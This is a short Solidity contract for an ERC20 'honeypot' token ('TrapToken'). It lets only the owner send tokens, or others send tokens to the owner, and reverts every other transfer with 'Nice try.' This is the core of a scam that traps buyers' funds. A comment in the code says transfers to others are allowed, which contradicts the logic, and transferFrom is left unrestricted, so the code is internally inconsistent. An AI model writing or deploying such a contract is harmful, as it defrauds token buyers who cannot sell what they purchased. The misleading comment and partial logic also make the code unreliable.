import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract HoneypotToken is ERC20 {
    address public owner;

    constructor() ERC20("TrapToken", "TRAP") {
        owner = msg.sender;
        _mint(msg.sender, 1_000_000 * 1e18);
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        // Allow transfers to others
        if (msg.sender == owner || to == owner) {
            return super.transfer(to, amount);
        }
        revert("Nice try.");
    }
}
